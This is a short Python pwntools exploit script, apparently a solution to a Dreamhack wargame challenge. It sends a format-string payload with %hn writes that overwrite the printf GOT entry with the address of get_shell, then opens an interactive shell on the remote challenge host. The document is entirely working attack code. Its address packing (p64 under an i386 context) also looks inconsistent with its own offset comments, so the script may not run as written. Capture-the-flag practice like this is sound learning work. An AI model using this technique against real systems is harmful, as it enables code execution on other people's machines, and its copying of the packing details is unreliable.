from pwn import *

context.arch = "i386"

p = remote("host3.dreamhack.games", 12415)
elf = ELF("./basic_exploitation_003")

get_shell = elf.symbols['get_shell']
# get_shell = 0x8048669
# 0x0804 = 2052
# 0x8669 = 34409

printf_got = elf.got['printf']
# printf_got = 0x804a010

# 34409 - 2052 = 32357
payload = b"%2052c%7$hn"    # 11bytes
payload += b"%32357c%8$hn"  # 12bytes
payload += b"a"             # 여기까지 24bytes
payload += p64(printf_got + 2)
payload += p64(printf_got)

p.send(payload)
p.interactive()
